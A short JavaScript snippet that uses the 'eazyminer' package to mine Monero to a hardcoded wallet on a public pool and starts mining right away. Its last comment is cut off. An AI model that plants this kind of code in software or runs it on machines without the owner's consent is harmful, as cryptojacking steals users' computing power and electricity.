const Miner = require('eazyminer');
//
const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB',
        url: 'pool.hashvault.pro:5555', // optional pool URL,
    }],
    autoStart: false // optional delay
});

miner.start(); // optional manually start the m
// //
